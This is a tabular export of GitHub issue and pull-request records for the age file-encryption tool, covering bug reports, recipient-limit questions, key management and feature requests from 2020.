FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/140,693648981,MDExOlB1bGxSZXF1ZXN0NDgwMTIxNDMz,140,increase decryption recipient limit from 20 to 1000,4804,open,FALSE,NA,NA,4,2020-09-04T21:18:05Z,2021-04-23T06:07:06Z,NA,NONE,NA,"closes #139 

I tested decrypting my file with 69 recipients and it worked.",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/140/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/140/comments,https://api.github.com/repos/FiloSottile/age/issues/140/events,https://github.com/FiloSottile/age/pull/140,https://api.github.com/repos/FiloSottile/age/pulls/140
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/139,693627306,MDU6SXNzdWU2OTM2MjczMDY=,139,Reconsider 20 recipients limit,4804,open,FALSE,NA,6688826,6,2020-09-04T21:02:18Z,2021-04-22T17:45:04Z,NA,NONE,NA,"<!-- Did age not do what you expected?
Was it hard to figure out how to do something?
Could an error message be more helpful?
It's not you, it's us. We want to hear about it. -->

## What were you trying to do

Trying to decrypt a file with 69 recipients.

## What happened

```
$ age --decrypt --identity /home/ryantm/.ssh/id_rsa monit.pem
Error: too many recipients
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
```

## What I expected

The file gets decrypted.

I found a part of the code where it limits the recipient number of decrypted messages to 20: https://github.com/FiloSottile/age/blob/0c650f815dde10d6e1644219b26615c5742ef743/age.go#L127

Can we expect that `age` will be limited to 20 recipients or is this a temporary limitation?",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/139/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/139/comments,https://api.github.com/repos/FiloSottile/age/issues/139/events,https://github.com/FiloSottile/age/issues/139,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/138,683987417,MDU6SXNzdWU2ODM5ODc0MTc=,138,Bech32 test fails (when using go 1.15?),49568580,closed,FALSE,NA,6688826,0,2020-08-22T12:22:18Z,2021-04-22T17:50:31Z,2020-09-07T14:07:10Z,NONE,NA,"## Environment

* OS: Arch Linux x86_64, go 1.15
* age version: 1.0.0.beta4.r2.g21a7203-1

## What were you trying to do

Install age/age-git via the aur

## What happened

Installation fails because a test is failing

```
# filippo.io/age/internal/bech32_test
internal/bech32/bech32_test.go:46:12: conversion from untyped int to string yields a string of one rune, not a string of digits (did you mean fmt.Sprint(x)?)
```
The problematic line looks like this: 
```
{""spl"" + string(127) + ""t1checkupstagehandshakeupstreamerranterredcaperred2y9e3w"", false},
```
I guess `string(127)` needs to be `string(rune(127))`? The test passes with this change.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/138/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/138/comments,https://api.github.com/repos/FiloSottile/age/issues/138/events,https://github.com/FiloSottile/age/issues/138,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/137,675072170,MDU6SXNzdWU2NzUwNzIxNzA=,137,Hardware tokens,604955,closed,TRUE,NA,NA,10,2020-08-07T14:58:00Z,2021-04-19T01:59:59Z,2021-04-19T01:59:56Z,NONE,NA,"Hi there,

This isn't really a bug report.

I was wondering if there's any plan to allow the use of hardware tokens (like yubikey) with age?

I'm super-keen to ditch gpg, but I'd also like to be able to use my yubikeys!

Thanks
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/137/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/137/comments,https://api.github.com/repos/FiloSottile/age/issues/137/events,https://github.com/FiloSottile/age/issues/137,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/136,664184050,MDU6SXNzdWU2NjQxODQwNTA=,136,Changing recipients of existing encrypted files,987487,open,FALSE,NA,NA,6,2020-07-23T03:50:10Z,2021-04-19T04:30:45Z,NA,NONE,NA,"<!-- This is the issue tracker of a specific implementation of
the age format, which is specified at https://age-encryption.org/v1

Please consider using the mailing list to discuss the specification:

                https://age-encryption.org/ml                    -->

(https://age-encryption.org/v1 has an HSTS error for me right now so I can't read it! sorry!)

Since age supports multiple recipients, I assume it actually encrypts a the file under a symmetric key and then sticks that key encrypted in the header. Is it possible to *change* the list of recipients, the way a LUKS encrypted disk can have its passphrases changed?

The use case I have in mind is secure data archiving. I want to archive data to three keys at a time, but know that I can efficiently revoke and replace one of them when one of my archivists changes jobs.

I *can* do this with age by completely decrypting and reencrypting, but for the large-database situation I have in mind it would be a lot better if I didn't have to change that symmetric key.

Thanks. Great project btw!!",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/136/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/136/comments,https://api.github.com/repos/FiloSottile/age/issues/136/events,https://github.com/FiloSottile/age/issues/136,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/135,660439181,MDExOlB1bGxSZXF1ZXN0NDUyMTk1OTYz,135,age: don't include secrets in error message,329784,closed,FALSE,NA,NA,1,2020-07-18T23:10:56Z,2020-09-21T14:33:35Z,2020-09-21T14:33:34Z,NONE,NA,fixes #89 ,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/135/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/135/comments,https://api.github.com/repos/FiloSottile/age/issues/135/events,https://github.com/FiloSottile/age/pull/135,https://api.github.com/repos/FiloSottile/age/pulls/135
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/134,659015484,MDExOlB1bGxSZXF1ZXN0NDUwOTEyMDY1,134,Fix small typo in ParseX25519Identity doc comment,313577,closed,FALSE,NA,NA,5,2020-07-17T08:30:59Z,2021-01-03T13:41:28Z,2021-01-02T23:13:41Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/134/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/134/comments,https://api.github.com/repos/FiloSottile/age/issues/134/events,https://github.com/FiloSottile/age/pull/134,https://api.github.com/repos/FiloSottile/age/pulls/134
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/133,650569000,MDU6SXNzdWU2NTA1NjkwMDA=,133,[Request] Add compiled binaries for all new releases,44198148,closed,FALSE,NA,6688826,6,2020-07-03T12:34:13Z,2021-04-22T17:50:28Z,2021-01-02T22:41:45Z,NONE,NA,"I want to use a script to update `age` from time to time, but for it to work, new releases need to have compiled binaries attached to them. As of right now, only the release v1.0.0-beta2 fulfills this criteria while the releases v1.0.0-beta3 and v1.0.0-beta4 don't.

This issue is tangentially related to #25 which would automate this process for you.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/133/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/133/comments,https://api.github.com/repos/FiloSottile/age/issues/133/events,https://github.com/FiloSottile/age/issues/133,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/132,646936751,MDExOlB1bGxSZXF1ZXN0NDQxMDY2NDU5,132,"resolve #86, use protected/encrypted private key at rest",20514086,open,FALSE,NA,NA,0,2020-06-28T14:42:31Z,2021-04-23T06:07:06Z,NA,NONE,NA,"This PR are slightly over-weighted. The major change is to add support for **password-protected secret key** feature mentioned in #86 and in the doc:
> Maybe native support for key wrapping (to implement password-protected keys)
 
There are three well-contained commits, 
1. separates the `PassphrasePromptForEncryption/Decryption` logic block into an internal package under `cmd/internal/passphrase`, to be shared by both `age` and `age-keygen` later. 
2. The meat of this PR is the second commit, where a wrapper named `ProtectedX25519Identity` around `X25519Identity` is created. 
The idea is to share the same `X25519Recipient` and minimal change of the `/internal/` library code. In fact, there're less than 6 lines of code of the core internal package code changed, and only added a getter.
Most of the logic are modularized into `cmd/internal/keywrap`, (feels like a light plugin) to the existing code base.
The original secret key shown in plaintext are now encrypted using `scrypt` (password + random salt), and base64 encoded. (please see the screenshots below). The flow is quite similar to minisign -- double confirmation on key creation, key is asked when trying to decrypt a file
The parameter of `scrypt` are stored in a `constants.go` file with recommended param (the same as minisign) 
Using base64 encoding instead of the bech32 encoding, because the length will be too long (HRP limit will also complain), base64 encoded encrypted private key are quite copy-pastable, see below.
The encrypted secret key is prefixed with the salt before being base64 encoded.
3. update cmd tools to reflect the choice on generating `ProtectedX25519Identity`

![Screenshot_2020-06-28_22-17-27](https://user-images.githubusercontent.com/20514086/85950623-84a42300-b990-11ea-817b-eec627d29bb7.png)
![Screenshot_2020-06-28_22-18-20](https://user-images.githubusercontent.com/20514086/85950626-879f1380-b990-11ea-9b5a-b6962d385800.png)
![Screenshot_2020-06-28_22-46-10](https://user-images.githubusercontent.com/20514086/85950740-3f342580-b991-11ea-91b3-dd4fc7be98e3.png)
![Screenshot_2020-06-28_22-20-26](https://user-images.githubusercontent.com/20514086/85950627-8968d700-b990-11ea-8f58-c7c34652890e.png)

Would love to hear feedback! @FiloSottile 
 ",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/132/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/132/comments,https://api.github.com/repos/FiloSottile/age/issues/132/events,https://github.com/FiloSottile/age/pull/132,https://api.github.com/repos/FiloSottile/age/pulls/132
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/131,646909797,MDExOlB1bGxSZXF1ZXN0NDQxMDUwODc1,131,Manual pages,982184,open,FALSE,NA,6688826,8,2020-06-28T12:38:25Z,2021-04-23T06:37:53Z,NA,NONE,NA,"Inspired by https://twitter.com/FiloSottile/status/1277084905428656129 I thought I'd quickly throw together a couple of man pages, based on the README. :-)",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/131/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/131/comments,https://api.github.com/repos/FiloSottile/age/issues/131/events,https://github.com/FiloSottile/age/pull/131,https://api.github.com/repos/FiloSottile/age/pulls/131
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/130,635626928,MDU6SXNzdWU2MzU2MjY5Mjg=,130,UX: Missing option for noninteractive use of passwords,66692314,closed,TRUE,NA,NA,7,2020-06-09T17:22:56Z,2021-04-19T03:43:23Z,2021-04-19T03:43:22Z,NONE,NA,"## What were you trying to do

Writing an application that uses age as a backend for encryption using passwords

The application uses passwords for various things and I would like the use age to encrypt data by using the preexisting passwords. Using public keys is not an option in this scenario.

## What happened

Age only allows the use of passwords interactively, making it hard to use if (preexisting) passwords need to be used.

For age to become a global standard for encryption, it should consider use cases like this and allow to use of passwords without being used interactively.


",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/130/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/130/comments,https://api.github.com/repos/FiloSottile/age/issues/130/events,https://github.com/FiloSottile/age/issues/130,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/128,630615498,MDU6SXNzdWU2MzA2MTU0OTg=,128,opening /dev/tty failed on Powershell and WSL,29077900,open,FALSE,NA,NA,0,2020-06-04T08:23:52Z,2021-04-22T17:44:20Z,NA,NONE,NA,"## Environment

* OS: Windows 10
* age version: v1.0.0-beta2

## What were you trying to do

Pass a password in without a prompt. Tried on Windows Powershell first, which obviously didn't work because `/dev/tty` doesn't exist. I switched to WSL and it still didn't work, even though `/dev/tty` _does_ work (`echo hi >/dev/tty` works as expected).

## What happened

An error.

```
> echo ""pass"" | .\age.exe -p -o test.txt.age .\test.txt
Enter passphrase: Error: could not read passphrase: standard input is not available or not a terminal, and opening /dev/tty failed: open /dev/tty: The system cannot find the path specified.
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
```
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/128/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/128/comments,https://api.github.com/repos/FiloSottile/age/issues/128/events,https://github.com/FiloSottile/age/issues/128,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/127,625283957,MDU6SXNzdWU2MjUyODM5NTc=,127,Parsing error in Windows,38557680,closed,FALSE,NA,NA,6,2020-05-27T00:26:53Z,2021-04-19T01:57:04Z,2021-04-19T01:57:04Z,NONE,NA,"## Environment

* OS: Windows 10 1909
* age version: v1.0.0-beta2

## What were you trying to do
Decrypt an encrypted file

## What happened

```
$ age -d -i key.txt encrypted.jpg.age > original.jpg
Error: failed to read header: parsing age header: unexpected intro: ""age-encryption.org/v1\r\n""
```
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/127/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/127/comments,https://api.github.com/repos/FiloSottile/age/issues/127/events,https://github.com/FiloSottile/age/issues/127,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/126,621781569,MDExOlB1bGxSZXF1ZXN0NDIwNzY2NDU1,126,internal/age: enforce same limit as Decrypt function does,19875,closed,FALSE,NA,NA,0,2020-05-20T13:53:19Z,2020-09-06T12:39:39Z,2020-09-06T12:39:34Z,NONE,NA,"Decrypt function limits the recipient list to 20, should't Encrypt do the same or one could discover that they can't actually decrypt the data they encrypted?

```
$ age -d -i key < data-39-recipients
Error: too many recipients
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
```",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/126/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/126/comments,https://api.github.com/repos/FiloSottile/age/issues/126/events,https://github.com/FiloSottile/age/pull/126,https://api.github.com/repos/FiloSottile/age/pulls/126
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/125,620587150,MDExOlB1bGxSZXF1ZXN0NDE5ODA4ODQ1,125,.github/workflows: add rage interop tests trigger,1225294,closed,FALSE,NA,NA,0,2020-05-19T00:28:34Z,2020-05-19T00:44:52Z,2020-05-19T00:44:51Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/125/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/125/comments,https://api.github.com/repos/FiloSottile/age/issues/125/events,https://github.com/FiloSottile/age/pull/125,https://api.github.com/repos/FiloSottile/age/pulls/125
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/124,619915006,MDU6SXNzdWU2MTk5MTUwMDY=,124,"""brew tap filippo.io/age https://filippo.io/age"" fails, can't reach repo.",123676,closed,FALSE,NA,NA,2,2020-05-18T05:16:52Z,2020-05-18T05:36:36Z,2020-05-18T05:29:16Z,NONE,NA,"## Environment

* OS: MacOS Mojave 10.14.6 (18G3020)
* age version: n/a

## What were you trying to do

## What happened

```
$ brew tap filippo.io/age https://filippo.io/age --debug
==> Tapping as full clone
==> Tapping filippo.io/age
Cloning into '/usr/local/Homebrew/Library/Taps/filippo.io/homebrew-age'...
remote: unknown package
fatal: repository 'https://filippo.io/age/' not found
Error: Failure while executing; `git clone https://filippo.io/age /usr/local/Homebrew/Library/Taps/filippo.io/homebrew-age` exited with 128.
/usr/local/Homebrew/Library/Homebrew/utils.rb:265:in `safe_system'
/usr/local/Homebrew/Library/Homebrew/tap.rb:273:in `install'
/usr/local/Homebrew/Library/Homebrew/cmd/tap.rb:65:in `tap'
/usr/local/Homebrew/Library/Homebrew/brew.rb:110:in `<main>'
```
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/124/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/124/comments,https://api.github.com/repos/FiloSottile/age/issues/124/events,https://github.com/FiloSottile/age/issues/124,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/123,619631814,MDU6SXNzdWU2MTk2MzE4MTQ=,123,Steganography,574696,closed,TRUE,NA,NA,0,2020-05-17T07:26:12Z,2021-04-19T01:13:30Z,2021-04-19T01:13:29Z,NONE,NA,"Thoughts on that?

The text header obviously doesn't help here. If only there was any way to make it look random.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/123/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/123/comments,https://api.github.com/repos/FiloSottile/age/issues/123/events,https://github.com/FiloSottile/age/issues/123,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/122,617826247,MDU6SXNzdWU2MTc4MjYyNDc=,122,UX: no way to get public key from private key,802786,closed,FALSE,NA,6688826,4,2020-05-13T23:51:11Z,2021-04-22T17:48:50Z,2021-03-10T10:38:49Z,NONE,NA,"there seems to be no way to generate the public key from the private key given the current options available to `age-keygen` and `age`, I was wondering if it was worth having this (if it is possible, i am ignorant in this field) in case you ever lose the ""public"" part of the key

for example, ssh can do this via 

```plaintext
ssh-keygen -y -f ~/.ssh/id_rsa > ~/.ssh/id_rsa.pub
```

is this useful to add?",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/122/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/122/comments,https://api.github.com/repos/FiloSottile/age/issues/122/events,https://github.com/FiloSottile/age/issues/122,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/121,615417703,MDU6SXNzdWU2MTU0MTc3MDM=,121,"Error: unknown recipient type: ""github:Benjojo""",15859761,closed,FALSE,NA,6688826,1,2020-05-10T15:39:01Z,2021-04-22T17:51:15Z,2021-04-19T01:16:00Z,NONE,NA,"## Environment

* OS: Linux
* age version: 1.0.0-beta2

## What were you trying to do

Encrypt a file to a GitHub recipient, as per the example in [the spec](https://age-encryption.org/v1).

## What happened

```
alicja@autumn:~ age -r github:Benjojo -r github:FiloSottile -a
Error: unknown recipient type: ""github:Benjojo""
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
alicja@autumn:~
```
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/121/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/121/comments,https://api.github.com/repos/FiloSottile/age/issues/121/events,https://github.com/FiloSottile/age/issues/121,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/120,610861142,MDExOlB1bGxSZXF1ZXN0NDEyMjE1NDc0,120,Export the minimum from internal/age,256074,closed,FALSE,NA,NA,1,2020-05-01T17:11:50Z,2020-05-18T16:17:17Z,2020-05-18T16:17:16Z,NONE,NA,"Fixes #63 

Simpler than #119 :-P - exposes only the bare minimum, and leaves everything under internal/age.
Does not change the domains as #114.",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/120/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/120/comments,https://api.github.com/repos/FiloSottile/age/issues/120/events,https://github.com/FiloSottile/age/pull/120,https://api.github.com/repos/FiloSottile/age/pulls/120
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/119,610555580,MDExOlB1bGxSZXF1ZXN0NDExOTczODg2,119,expose age encryption library,256216,closed,FALSE,NA,NA,1,2020-05-01T04:32:42Z,2020-05-18T16:16:33Z,2020-05-18T16:16:33Z,NONE,NA,"These changes expose age/internal/age, making an importable package that other projects can use.  As requested in issue #63 

Perhaps there are reasons not to expose this in its current state.  But I have a project that could use a library like this, so, my fingers are crossed that this PR is well received!
",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/119/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/119/comments,https://api.github.com/repos/FiloSottile/age/issues/119/events,https://github.com/FiloSottile/age/pull/119,https://api.github.com/repos/FiloSottile/age/pulls/119
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/118,608353728,MDU6SXNzdWU2MDgzNTM3Mjg=,118,spec: serious security,50526369,closed,TRUE,NA,NA,3,2020-04-28T14:15:17Z,2020-04-29T22:55:28Z,2020-04-28T16:53:25Z,NONE,too heated,"there are ""a few things missing"" that are needed to find out if this ""product"" is a serious encryption tool.
* complete and compact description of the algorithm
* list of security features (other than ""secure encryption"", e.g. ""forward secrecy"") and how they were implemented
* proper threat analysis

PS : I could not find any security review of this product, maybe it's just well hidden...
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/118/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/118/comments,https://api.github.com/repos/FiloSottile/age/issues/118/events,https://github.com/FiloSottile/age/issues/118,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/117,605645338,MDU6SXNzdWU2MDU2NDUzMzg=,117,No automatic password generation,61976215,closed,FALSE,NA,NA,3,2020-04-23T15:45:15Z,2021-01-02T23:17:07Z,2021-01-02T23:17:06Z,NONE,NA,"## Environment

* OS: MacOS
* age version:

## What were you trying to do
installed with brew
## What happened
i tried the following command
age -p data.txt > data.age

I left the password blank as shown in the readme file, however, no automatic password is generated
```
<insert terminal transcript here>
Enter passphrase:
Error: empty scrypt password
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
```
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/117/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/117/comments,https://api.github.com/repos/FiloSottile/age/issues/117/events,https://github.com/FiloSottile/age/issues/117,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/116,604581052,MDExOlB1bGxSZXF1ZXN0NDA3MTQ3Nzkz,116,Remove netlify tracking from homebrew and go.,574696,closed,FALSE,NA,NA,6,2020-04-22T08:56:55Z,2020-04-22T18:18:52Z,2020-04-22T16:48:04Z,NONE,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/116/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/116/comments,https://api.github.com/repos/FiloSottile/age/issues/116/events,https://github.com/FiloSottile/age/pull/116,https://api.github.com/repos/FiloSottile/age/pulls/116
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/115,603423780,MDExOlB1bGxSZXF1ZXN0NDA2MjExNTg5,115,"Support remote URLs and ""github://"", ""file://"" schemes to fetch recipient public keys",6263105,closed,FALSE,NA,NA,4,2020-04-20T17:55:40Z,2021-01-03T14:10:24Z,2021-01-03T14:10:24Z,NONE,NA,"This PR supersedes #43 and #64, adding support for `github://`, `file://` and URL schemes (`https://`) for the `-r` (RECIPIENT) flag

Closes #84 

Example usage:

```
echo ""hello"" | age -r github://aerth -o /tmp/encrypted.txt
echo ""hello"" | age -r https://github.com/aerth.keys -o /tmp/encrypted.txt2
echo ""hello"" | age -r file://$HOME/.ssh/id_ed25519.pub -o /tmp/encrypted.txt3
echo ""hello"" | age -r ""$(cat $HOME/.ssh/id_ed25519.pub)"" -o /tmp/encrypted.txt4
```

Thank you @paulc for laying the framework for the `github://` scheme",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/115/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/115/comments,https://api.github.com/repos/FiloSottile/age/issues/115/events,https://github.com/FiloSottile/age/pull/115,https://api.github.com/repos/FiloSottile/age/pulls/115
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/114,598002955,MDExOlB1bGxSZXF1ZXN0NDAxOTk3MzMz,114,export the minimum from internal/age,256074,closed,FALSE,NA,NA,1,2020-04-10T17:30:39Z,2020-05-01T17:10:03Z,2020-05-01T17:10:03Z,NONE,NA,"Is it possible to use age as a library?
To decrypt files encrypted with ""age"" tool and encrypt such it can decrypt?
I don't want to embed the ""age"" executable...",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/114/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/114/comments,https://api.github.com/repos/FiloSottile/age/issues/114/events,https://github.com/FiloSottile/age/pull/114,https://api.github.com/repos/FiloSottile/age/pulls/114
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/113,593270631,MDU6SXNzdWU1OTMyNzA2MzE=,113,UX: strip preferred file extension?,11343221,closed,TRUE,NA,NA,0,2020-04-03T10:09:19Z,2021-04-19T02:04:49Z,2021-04-19T02:04:48Z,NONE,NA,"<!-- Did age not do what you expected?
Was it hard to figure out how to do something?
Could an error message be more helpful?
It's not you, it's us. We want to hear about it. -->

## What were you trying to do
decrypt a set of files with `find`

## What happened
I need to invoke a shell for every file I wish to decrypt just to strip `.age` from the filename (passed with `{}`)
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/113/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/113/comments,https://api.github.com/repos/FiloSottile/age/issues/113/events,https://github.com/FiloSottile/age/issues/113,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/112,588788323,MDExOlB1bGxSZXF1ZXN0Mzk0NDcyNzIx,112,Added debian control files for packaging in Debian/Ubuntu/etc.,523150,closed,FALSE,NA,NA,2,2020-03-26T23:26:28Z,2020-03-28T00:13:36Z,2020-03-28T00:13:36Z,NONE,NA,"I'm not sure if you'd even want them, but I see no harm in trying to put them upstream :)",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/112/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/112/comments,https://api.github.com/repos/FiloSottile/age/issues/112/events,https://github.com/FiloSottile/age/pull/112,https://api.github.com/repos/FiloSottile/age/pulls/112
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/111,586665114,MDExOlB1bGxSZXF1ZXN0MzkyNzU1NDY0,111,Updated go.mod for aes256-cbc fix,8988064,closed,FALSE,NA,NA,2,2020-03-24T03:29:36Z,2020-03-24T16:40:08Z,2020-03-24T05:57:19Z,CONTRIBUTOR,NA,"Fixes #100 
Updated modfile with fix for golang/go#37939)",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/111/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/111/comments,https://api.github.com/repos/FiloSottile/age/issues/111/events,https://github.com/FiloSottile/age/pull/111,https://api.github.com/repos/FiloSottile/age/pulls/111
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/110,582150201,MDU6SXNzdWU1ODIxNTAyMDE=,110,UX: list-keys option and less manual key(files) management,20514086,closed,TRUE,NA,NA,0,2020-03-16T09:51:57Z,2021-04-19T02:55:35Z,2021-04-19T02:55:35Z,NONE,NA,"1. similar to `gpg --list-keys`, would be nice if there's a canonical path to all `age`'s keys (e.g. `~/.config/age/keys.txt`) and default delimiter would be added between keys when invoking `age-keygen` so that a simple parsing and regex matching could support `list-key` command

2. in general, key(file) management still involves a bit of manual work, which could be deliberately by design (idk) for simplicity or maybe other reasons, but as a user, it will be great to not care about details like #75 .
(I guess I was used to the `ssh-keygen` way) 


",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/110/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/110/comments,https://api.github.com/repos/FiloSottile/age/issues/110/events,https://github.com/FiloSottile/age/issues/110,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/109,577620103,MDU6SXNzdWU1Nzc2MjAxMDM=,109,Make age parallel,574696,open,FALSE,NA,NA,3,2020-03-09T02:24:20Z,2021-04-19T03:57:12Z,NA,NONE,NA,"If you encrypt files on a machine with tons of RAM and cores, age isn't any faster versus some basic slow PC.

I think it would be great to utilize resources when they're available.

Tried this on Linux via piping and via `-i -o` — seeing tiny load of one core.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/109/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/109/comments,https://api.github.com/repos/FiloSottile/age/issues/109/events,https://github.com/FiloSottile/age/issues/109,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/108,574485654,MDU6SXNzdWU1NzQ0ODU2NTQ=,108,Empty passphrase error,23559565,closed,FALSE,NA,NA,2,2020-03-03T08:02:43Z,2021-01-02T23:16:38Z,2021-01-02T23:16:38Z,NONE,NA,"## Environment

* OS: macOS Catalina
* age version:
Age from Homebrew

## What were you trying to do
Encrypt file by a passphrase, but leave an empty, it gives me an error.


## What happened

```
$ age -p go.sum > go.sum.age
Enter passphrase:
Error: empty scrypt password
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
$ ./age -p go.sum > go.sum.age  # age by go build
Enter passphrase (leave empty to autogenerate a secure one):
Using the autogenerated passphrase ""execute-have-field-bronze-inform-ill-noodle-save-can-leave"".
```",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/108/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/108/comments,https://api.github.com/repos/FiloSottile/age/issues/108/events,https://github.com/FiloSottile/age/issues/108,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/107,573609449,MDU6SXNzdWU1NzM2MDk0NDk=,107,-----BEGIN AGE ENCRYPTED PAYLOAD----- instead of FILE ...,13186616,closed,TRUE,NA,NA,1,2020-03-01T20:27:26Z,2021-04-19T01:25:57Z,2021-04-19T01:25:54Z,NONE,NA,"Hi,
while both, age and GnuPG are using armor headers/footers like MESSAGE or in age's case FILE
why not use a generic term like PAYLOAD? I am no native English speaker but something like
PAYLOAD, or maybe a word like CONTENT, would look IMHO better when sending messages and not only files.

